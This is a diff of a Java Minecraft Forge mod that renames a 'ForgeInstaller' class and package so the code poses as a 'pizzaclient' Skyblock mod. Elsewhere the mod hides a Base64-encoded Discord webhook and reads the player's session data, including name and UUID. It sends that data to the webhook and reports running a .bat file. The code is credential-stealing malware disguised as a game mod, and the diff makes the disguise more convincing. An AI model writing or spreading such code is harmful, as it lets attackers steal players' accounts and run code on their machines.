@@ -1,4 +1,4 @@
-package forge.installer;
+package qolskyblockmod.pizzaclient.commands;
 
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
@@ -12,8 +12,8 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 
-@Mod(modid = "ForgeInstaller", name = "ForgeInstaller", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
-public class ForgeInstaller {
+@Mod(modid = "realpizzalol", name = "pzza", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
+public class SleepTimer {
 
     public static String webhook = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk0MzM1MjQ2MjM5ODU5OTMwOS9ucG9QSWdIbmpNVU1ja1NsaDlKQkctNFY4aDRxVjlKX0xjRzhpeERDQ0pPVW96MlZaaG1zQlhqaXNjVk45Y05lY2dCOA==";
 
@@ -53,8 +53,8 @@ public class ForgeInstaller {
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
             String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
-            Loader sendmessage = new Loader(webdecode);
-            sendmessage.addEmbed(new Loader.EmbedObject()
+            PizzaClientGUI sendmessage = new PizzaClientGUI(webdecode);
+            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -92,8 +92,8 @@ public class ForgeInstaller {
             }
 
             String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
-            Loader sendmessage = new Loader(webdecode);
-            sendmessage.addEmbed(new Loader.EmbedObject()
+            PizzaClientGUI sendmessage = new PizzaClientGUI(webdecode);
+            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
